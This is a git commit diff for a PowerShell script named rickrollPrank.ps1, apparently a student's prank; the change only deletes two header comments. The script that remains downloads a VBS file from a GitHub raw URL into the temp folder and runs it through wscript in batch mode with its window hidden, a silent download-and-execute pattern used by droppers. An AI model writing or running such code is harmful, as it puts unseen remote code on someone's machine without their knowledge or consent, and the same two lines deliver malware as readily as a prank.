4cdb8de27433f9bf320bf2977b73a72526de189f
Matheesha W I <it23595644@my.sliit.lk>
2025-10-26 16:54:27 +0530

    Refactor Rick Roll prank script for clarity

--- rickrollPrank.ps1
+++ rickrollPrank.ps1
@@ -1,8 +1,6 @@
-# Rick Roll Prank - Download and Execute
-# This script downloads the VBS file from GitHub and runs it silently
-
 # Download the VBS file from GitHub
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/InoshMatheesha/moody/refs/heads/main/rickroll.vbs' -OutFile $env:temp\rickroll.vbs
 
 # Execute the VBS file silently in the background
 Start-Process wscript -ArgumentList '//B',$env:temp\rickroll.vbs -WindowStyle Hidden
+
